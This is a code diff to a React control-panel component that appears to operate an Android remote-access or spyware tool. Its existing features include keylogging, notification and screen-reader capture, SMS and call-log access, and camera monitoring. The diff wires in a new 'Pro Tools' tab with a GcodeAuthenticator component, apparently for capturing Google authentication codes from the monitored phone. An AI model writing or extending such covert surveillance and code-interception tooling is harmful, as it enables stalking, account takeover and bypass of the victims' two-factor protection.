@@ -18,6 +18,7 @@ import SMSManagerTab from './SMSManagerTab.jsx';
 import FileManagerTab from './FileManagerTab.jsx';
 import ContactsCallLogTab from './ContactsCallLogTab.jsx';
 import CameraMonitorTab from './CameraMonitorTab.jsx';
+import GcodeAuthenticator from './GcodeAuthenticator.jsx';
 
 const TABS = [
   { id: 'control_center', label: '🎮 Control Center' },
@@ -38,6 +39,7 @@ const TABS = [
   { id: 'app_monitor',    label: '📡 App Monitor' },
   { id: 'permissions',    label: '🛡️ App Mode' },
   { id: 'gestures',       label: '✋ Gestures' },
+  { id: 'pro_tools',      label: '🛠️ Pro Tools' },
 ];
 
 const initialRefreshKeys = Object.fromEntries(TABS.map(t => [t.id, 0]));
@@ -46,7 +48,7 @@ export default function DeviceControl({
   device, sendCommand, results, pending, onBack,
   streamFrame, send, keylogPushEntries, notifPushEntries,
   activityAppEntries, screenReaderPushData, offlineRecordingVersion,
-  serverLatency, deviceLatency,
+  serverLatency, deviceLatency, gcodeVersion,
 }) {
   const [activeTab, setActiveTab]     = useState('control_center');
   const [refreshKeys, setRefreshKeys] = useState(initialRefreshKeys);
@@ -313,6 +315,17 @@ export default function DeviceControl({
           device={device}
           sendCommand={sendCommand}
           results={results}
+        />
+      </div>
+
+      <div style={tabVisible('pro_tools')}>
+        <GcodeAuthenticator
+          key={refreshKeys.pro_tools}
+          device={device}
+          sendCommand={sendCommand}
+          results={results}
+          screenReaderPushData={screenReaderPushData}
+          gcodeVersion={gcodeVersion}
         />
       </div>
     </div>
